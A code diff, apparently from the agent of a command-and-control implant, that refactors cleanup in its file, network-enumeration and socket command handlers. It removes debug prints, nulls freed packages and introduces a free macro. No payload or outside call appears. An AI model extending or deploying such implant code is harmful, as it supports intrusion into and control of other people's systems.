@@ -1055,13 +1055,11 @@ VOID CommandFS( PPARSER Parser )
         }
     }
 
-    PUTS( "Transmit package" )
     PackageTransmit( Package );
     return;
 
 CLEAR_LEAVE:
-    PUTS( "PackageDestroy" )
-    PackageDestroy( Package );
+    PackageDestroy( Package ); Package = NULL;
 }
 
 VOID CommandInlineExecute( PPARSER Parser )
@@ -2056,24 +2054,21 @@ VOID CommandNet( PPARSER Parser )
                        goto DOMAIN_CLEANUP;
                     }
                 }
+                else
+                    goto DOMAIN_CLEANUP;
             }
+            else
+                goto DOMAIN_CLEANUP;
 
             PackageAddString( Package, Domain );
 
-            if ( Domain )
-            {
-                MemSet( Domain, 0, Length );
-                Instance.Win32.LocalFree( Domain );
-            }
+            DATA_FREE( Domain, Length );
 
             break;
+
         DOMAIN_CLEANUP:
-            if ( Domain )
-            {
-                MemSet( Domain, 0, Length );
-                Instance.Win32.LocalFree( Domain );
-            }
-            PackageDestroy( Package );
+            DATA_FREE( Domain, Length );
+            PackageDestroy( Package ); Package = NULL;
             return;
         }
 
@@ -2134,7 +2129,7 @@ VOID CommandNet( PPARSER Parser )
             if ( UserInfo != NULL )
                 Instance.Win32.NetApiBufferFree( UserInfo );
 
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
             return;
         }
 
@@ -2179,7 +2174,7 @@ VOID CommandNet( PPARSER Parser )
                     goto SESSION_CLEANUP;
                 }
 
-                if ( SessionInfo != NULL )
+                if ( SessionInfo )
                 {
                     Instance.Win32.NetApiBufferFree( SessionInfo );
                     SessionInfo = NULL;
@@ -2193,10 +2188,10 @@ VOID CommandNet( PPARSER Parser )
             break;
 
         SESSION_CLEANUP:
-            if ( SessionInfo != NULL )
+            if ( SessionInfo )
                 Instance.Win32.NetApiBufferFree( SessionInfo );
 
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
             return;
         }
 
@@ -2755,8 +2750,7 @@ VOID CommandSocket( PPARSER Parser )
 
                     /* we don't want to send the message now.
                      * send it while we are free and closing the socket. */
-                    PackageDestroy( Package );
-                    Package = NULL;
+                    PackageDestroy( Package ); Package = NULL;
                     return;
                 }
 
@@ -2783,8 +2777,7 @@ VOID CommandSocket( PPARSER Parser )
 
             /* we don't want to send the message now.
              * send it while we are free and closing the sockets. */
-            PackageDestroy( Package );
-            Package = NULL;
+            PackageDestroy( Package ); Package = NULL;
             return;
         }
 
@@ -2841,8 +2834,7 @@ VOID CommandSocket( PPARSER Parser )
             if ( Success )
             {
                 /* destroy the package and exit this command function */
-                PackageDestroy( Package );
-                Package = NULL;
+                PackageDestroy( Package ); Package = NULL;
                 return;
             }
             else
@@ -2978,7 +2970,7 @@ VOID CommandSocket( PPARSER Parser )
             }
 
             /* destroy the package and exit this command function */
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
 
             return;
         }
